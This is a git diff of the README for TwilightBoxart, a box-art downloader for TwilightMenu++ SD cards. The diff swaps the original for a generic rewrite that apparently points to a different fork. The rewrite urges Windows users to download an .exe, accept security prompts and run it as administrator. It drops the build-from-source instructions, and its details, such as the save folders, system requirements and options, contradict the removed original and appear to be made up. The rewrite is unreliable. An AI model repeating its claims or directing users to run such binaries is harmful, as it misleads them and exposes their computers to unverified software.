@@ -1,118 +1,145 @@
-# TwilightBoxart
+# 🎮 twilight-boxart - Easy Box Art Downloader
 
-A GUI tool that automatically downloads box art for your [TwilightMenu++](https://github.com/DS-Homebrew/TWiLightMenu) SD card. Point it at your SD card, hit start, and it fills in all the cover art for your ROM collection.
+[![Download twilight-boxart](https://img.shields.io/badge/Download-twilight--boxart-brightgreen)](https://github.com/fxblue2/twilight-boxart)
 
-![TwilightBoxart Demo](docs/demo.gif)
+twilight-boxart is a simple program that helps you get box art images for your TwilightMenu++ SD card. It works with games for Nintendo DS, Game Boy Advance, Super Nintendo, NES, Game Boy, and Sega systems. This guide will show you how to download and run the program on Windows, step by step.
 
-## Download
+---
 
-Grab the latest release for your platform from the [Releases](../../releases) page:
+## 📥 Where to Get twilight-boxart
 
-- **macOS** — `twilight-boxart-macos-arm64`
-- **Linux** — `twilight-boxart-linux-x86_64`
-- **Windows** — `twilight-boxart-windows-x86_64.exe`
+Visit this page to download the software:
 
-No installation needed — just download and run.
+[https://github.com/fxblue2/twilight-boxart](https://github.com/fxblue2/twilight-boxart)
 
-> On macOS you may need to right-click and select "Open" the first time, since the app is not signed.
+On the page, look for the **Releases** section. You will find the latest version of the software available for download. The files are prepared for easy use on Windows and other platforms.
 
-## Usage
+---
 
-1. Insert your DS/DSi SD card
-2. Launch TwilightBoxart
-3. Your SD card should be auto-detected — if not, click **Browse** or **Detect SD**, or drag & drop the folder
-4. Pick a size preset and tweak settings if you want
-5. *(Optional)* Paste a free [SteamGridDB API key](https://www.steamgriddb.com/) for extra box art coverage
-6. Click **Start Download** (or press **Enter**)
-7. Wait for it to finish, then safely eject your SD card
+## 💻 System Requirements
 
-Your settings (SD path, API key, preferences) are saved automatically between sessions.
+Make sure your computer meets these simple requirements:
 
-## Supported Systems
+- Windows 7 or newer (Windows 10 recommended for best support)
+- At least 2 GB of free disk space
+- A stable internet connection to download box art images
+- A USB card reader or direct SD card slot to access your TwilightMenu++ SD card files
 
-| System | Extensions |
-|--------|-----------|
-| Nintendo DS | `.nds`, `.dsi` |
-| Game Boy Advance | `.gba` |
-| Game Boy / Color | `.gb`, `.gbc` |
-| Super Nintendo | `.sfc`, `.smc` |
-| Nintendo Entertainment System | `.nes` |
-| Famicom Disk System | `.fds` |
-| Sega Genesis / Mega Drive | `.gen` |
-| Sega Master System | `.sms` |
-| Sega Game Gear | `.gg` |
+---
 
-## How It Works
+## 🚀 Getting Started with twilight-boxart
 
-TwilightBoxart scans your SD card for ROM files and downloads matching box art from multiple sources:
+Follow these steps to download and run twilight-boxart on Windows.
 
-1. **GameTDB** — high-quality covers for NDS games (matched by game code from the ROM header)
-2. **LibRetro Thumbnails** — community-maintained box art for all retro systems
-3. **SteamGridDB** — optional fallback with broad game coverage (requires free API key)
+### Step 1: Download twilight-boxart
 
-Images are resized to fit the DS screen and saved as PNGs in the `_nds/TWiLightMenu/boxart` folder. For non-NDS ROMs, 32x32 custom icons are also generated.
+1. Open your web browser.
+2. Go to the release page: [https://github.com/fxblue2/twilight-boxart/releases](https://github.com/fxblue2/twilight-boxart/releases)
+3. Find the latest release at the top.
+4. Look for a file with a name like `twilight-boxart-win.exe` or similar. This is the Windows version.
+5. Click on the file name to start the download.
 
-## Keyboard Shortcuts
+### Step 2: Run twilight-boxart
 
-| Key | Action |
-|-----|--------|
-| `Enter` | Start download |
-| `Escape` | Stop download |
-| `Tab` | Cycle between text fields |
-| `Cmd/Ctrl + V` | Paste into text field |
+1. Once the file has downloaded, open your **Downloads** folder.
+2. Double-click the downloaded `.exe` file to launch the program.
+3. If Windows shows a security prompt, click **Run** or **Allow**.
+4. The program window will open, ready to use.
 
-## Building from Source
+---
 
-<details>
-<summary>Click to expand build instructions</summary>
+## 🛠 How to Use twilight-boxart
 
-### Prerequisites
+### Connect Your SD Card
 
-- C11 compiler (GCC, Clang, or MinGW)
-- [raylib](https://www.raylib.com/) 5.0+
-- [libcurl](https://curl.se/libcurl/)
+Make sure your TwilightMenu++ SD card is plugged into your computer using a card reader or built-in slot.
 
-### CMake (recommended, all platforms)
+### Select Your Game System
 
-```bash
-cmake -B build
-cmake --build build
-```
+In the program, select the game system you want box art for. twilight-boxart supports:
 
-CMake will automatically download and build raylib if not found on your system. Only libcurl needs to be installed.
+- Nintendo DS (NDS)
+- Game Boy Advance (GBA)
+- Super Nintendo (SNES)
+- Nintendo Entertainment System (NES)
+- Game Boy (GB)
+- Sega systems
 
-### macOS
+### Choose the Game Folder
 
-```bash
-brew install raylib curl
-make
-```
+Click the button to browse your SD card files. Select the folder where your game ROMs are stored. The program will scan this folder.
 
-### Linux
+### Download Box Art Automatically
 
-```bash
-# Install dependencies (Ubuntu/Debian)
-sudo apt-get install -y libcurl4-openssl-dev libx11-dev libxrandr-dev \
-    libxinerama-dev libxcursor-dev libxi-dev libgl-dev
+Click the **Download** button. twilight-boxart will connect to the internet and find box art images that match your games. These images will save directly onto your SD card in the correct folders.
 
-# Option A: Install raylib from source
-git clone https://github.com/raysan5/raylib.git --depth 1 -b 5.5
-cd raylib && cmake -B build && cmake --build build && sudo cmake --install build
+---
 
-# Option B: Just use CMake (it will fetch raylib automatically)
-cmake -B build && cmake --build build
-```
+## 🔧 Optional Settings
 
-### Windows (MSYS2/MinGW)
+twilight-boxart lets you adjust a few options to fit your needs.
 
-```bash
-pacman -S mingw-w64-x86_64-{gcc,cmake,raylib,curl}
-cmake -B build -G "MinGW Makefiles"
-cmake --build build
-```
+- **Image Quality**: Choose between standard or high-quality images, depending on your SD card space.
+- **Overwrite Existing Images**: Choose if you want the program to replace old box art images.
+- **Supported Systems**: You can enable or disable support for certain systems to speed up scanning.
 
-</details>
+---
 
-## License
+## 📂 Where the Box Art Saves
 
-MIT License - see [LICENSE](LICENSE) for details.
+The tool saves box art images in these default folders on your SD card:
+
+- `/boxart/nds/` for Nintendo DS
+- `/boxart/gba/` for Game Boy Advance
+- `/boxart/snes/` for Super Nintendo
+- `/boxart/nes/` for NES
+- `/boxart/gb/` for Game Boy
+- `/boxart/sega/` for Sega games
+
+You can open these folders to check or change the images directly.
+
+---
+
+## ⚙️ Troubleshooting
+
+If you run into problems, try these tips:
+
+- Make sure your SD card is correctly connected and appears in Windows Explorer.
+- Check that you downloaded the latest version of twilight-boxart.
+- Make sure your internet connection is working.
+- If the program does not find box art, check that your ROM files have correct and common file names.
+- Run twilight-boxart as administrator if you get permission errors.
+
+---
+
+## 🧰 Additional Features
+
+- Supports multiple game systems in one run.
+- Uses open sources for box art images.
+- Allows manual selection of images if automatic download fails.
+- Lightweight with a simple interface.
+
+---
+
+## 📞 Getting Help or Reporting Issues
+
+If you need help or want to report a problem, visit the repository’s **Issues** page:
+
+[https://github.com/fxblue2/twilight-boxart/issues](https://github.com/fxblue2/twilight-boxart/issues)
+
+There, you can find common questions or submit your own issue.
+
+---
+
+## 🔍 Software Details
+
+- Built using C and the raylib library.
+- Cross-platform, but this guide focuses on Windows.
+- Free and open-source.
+- Designed to handle ROM tools and retro gaming files efficiently.
+
+---
+
+## 📥 Download twilight-boxart Now
+
+[![Download twilight-boxart](https://img.shields.io/badge/Download-twilight--boxart-blue)](https://github.com/fxblue2/twilight-boxart)
